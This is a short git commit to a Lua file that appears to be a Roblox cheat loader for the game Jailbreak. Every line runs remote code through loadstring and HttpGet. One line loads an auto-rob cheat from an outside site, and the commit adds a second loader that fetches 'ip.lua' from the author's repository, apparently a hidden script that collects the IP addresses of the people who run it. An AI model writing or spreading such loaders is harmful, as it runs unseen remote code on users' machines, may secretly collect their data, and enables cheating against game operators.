2bfbf60acb5281fddcc40709e9267671286cfd38
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-27 21:04:14 -0300

    Actualizar jailbreak.lua

--- jailbreak.lua
+++ jailbreak.lua
@@ -1,1 +1,5 @@
+_G.script_executed = "jailbreak.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
+
 loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV5'))()
